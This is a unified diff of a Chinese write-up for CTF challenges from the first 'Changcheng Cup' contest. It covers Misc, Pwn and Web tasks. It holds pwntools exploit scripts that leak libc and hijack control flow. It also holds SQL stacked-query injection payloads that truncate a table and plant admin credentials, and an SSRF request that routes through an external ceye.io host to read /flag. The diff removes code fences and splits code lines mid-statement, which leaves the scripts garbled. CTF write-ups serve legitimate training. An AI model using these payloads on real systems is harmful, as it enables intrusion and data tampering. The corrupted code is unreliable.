@@ -5,11 +5,13 @@
 
 9月19日，由春秋GAME伽玛实验室支持的第一届“长城杯”网络安全大赛线上赛圆满结束。伽玛实验室精选了4道赛题的解题思路一起学习 ~
 
-Misc:你这flag保熟吗
+Misc:
+你这flag保熟吗
 
 将1.png和2.png拖到010editor查看，发现rar的文件头，另存为rar文件，解压后得到password.xls和hint.txt
 
-Pwn:easy_vm
+Pwn:
+easy_vm
 
 漏洞分析：
 
@@ -158,7 +160,8 @@ a.sendafter("> ",page_payload)
 
 a.interactive()
 
-Pwn:K1ng_in_h3Ap_II
+Pwn:
+K1ng_in_h3Ap_II
 
 1. 检查题目保护：
 
@@ -171,11 +174,6 @@ Web:p&p
 xxd -r hint.txt 
 
 password被base64编码了25次，编码后的前16个字符为Vm0wd2QyUXlVWGxW
-```
-
-
-
-```
 import xlrd
 import base64
 
@@ -209,44 +207,20 @@ print('成功读取excel')
 for i in range(25):
     password = base64.b64decode(password.encode('utf-8')).decode('utf-8')
 print(password)
-```
-
-
-
-```
 1f_y0u_h4ve_7he_fllllllag,_I_muSt_vvant_1t!
-```
-
-
-
-```
 error
-```
-
-
-
-```
 flag = [117, 111, 122, 116, 123, 83, 114, 82, 121, 118, 105, 103, 95, 88, 102, 105, 101, 118, 98, 49, 72, 95, 52, 95, 101, 101, 48, 109, 119, 118, 105, 117, 102, 33, 95, 120, 102, 105, 101, 118, 125, 101, 114, 114, 111, 114]
 for num in flag:
     print(chr(num), end='')
-```
-
-
-
-```
 uozt{SrRyvig_Xfievb1H_4_ee0mwviuf!_xfiev}error
-```
-
-
-
-```
 import string
 
 flag = 'uozt{SrRyvig_Xfievb1H_4_ee0mwviuf!_xfiev}'
 
 # 替换指定位置的字符
 def myreplace(old_s, char, index):
-    new_s = old_s[:index] + char + old_s[index+1:]
+    new_s = old_s[:
+index] + char + old_s[index+1:]
     return new_s
 
 # 埃特巴什码  解密
@@ -262,12 +236,7 @@ for i in range(len(flag)):
     else:
         pass
 print(flag)
-```
-
-
-
-```
-#coding=utf-8
+    #coding=utf-8
 from pwn import *
 local = 0#这里设置是本地还是远程
 exec_file="./pwn"
@@ -358,8 +327,8 @@ def SUB(idx_1,idx_2,dest_idx):
  
 
 relloc_offset = [0,2,4,6,0xb,0xc,0x10]
-#payload='x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'x00'    #stdout-0x33
-#debug()
+    #payload='x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'x00'    #stdout-0x33
+    #debug()
 a.sendlineafter("size: ",str(0x400))
 puts_got = elf.got["puts"]
 malloc_got = elf.got["malloc"]
@@ -397,16 +366,11 @@ page_payload += creat_page(text_linkmap_addr)#用泄露的linkmap地址初始�
 a.sendafter("> ",page_payload)
 
 a.interactive()
-```
-
-
-
-```
 from pwn import *
 context.log_level = 'debug'
 context.terminal = ['tmux','sp','-h']
 
-#p = process("./pwn")
+    #p = process("./pwn")
 p = remote("")
 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
@@ -484,11 +448,6 @@ payload2 += p64(libc_base+libc.symbols['write'])
 p.send(payload2)
 
 p.interactive()
-```
-
-
-
-```
 username=fake_admin&password=';show tables;&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
 //array(1) {
   [0]=>
@@ -499,11 +458,6 @@ array(1) {
   [0]=>
   string(27) "real_admin_here_do_you_find"
 }
-```
-
-
-
-```
 username=fake_admin&password=';show create table real_admin_here_do_you_find;&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
 //array(2) {
   [0]=>
@@ -516,23 +470,8 @@ username=fake_admin&password=';show create table real_admin_here_do_you_find;
   PRIMARY KEY (`id`)
 ) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4"
 }
-```
-
-
-
-```
 username=fake_admin&password=';truncate table real_admin_here_do_you_find;&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
-```
-
-
-
-```
 username=fake_admin&password=';replace real_admin_here_do_you_find value('1','admin_inner','admin');&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
-```
-
-
-
-```
 <?php 
 session_start();
 error_reporting(0);
@@ -545,9 +484,11 @@ if($_SESSION['username']!='admin_inner'){
 }
 
 function curlNet($route,$payload=null){
- $url = 'http://127.0.0.1:18888/'.$route;
+ $url = 'http://127.0.0.1:
+18888/'.$route;
  $ch = curl_init($url);
- curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
+ curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:
+application/json'));
  if($payload!==null){
   curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
  }
@@ -610,17 +551,7 @@ switch ($action) 
 
 }
 ?>
-```
-
-
-
-```
 /adminsapi.php?action=download
-```
-
-
-
-```
 from flask import Flask,request
 import json
 
@@ -651,22 +582,13 @@ def flag():
     return str(open('/flag').read().split('n'))
 
 app.run(host='127.0.0.1', port=18888)
-```
-
-
-
-```
 {"secrets":3.3e99999999999999}
-```
-
-
-
-```
 url:
 /adminsapi.php?action=curl
 
 json:
-{"url":"http://r.xxxxx.ceye.io:18888/flag","secrets":"00b252ba3f52a539ef90e7254f2d9874"}
+{"url":"http://r.xxxxx.ceye.io:
+18888/flag","secrets":"00b252ba3f52a539ef90e7254f2d9874"}
 ```
 
 
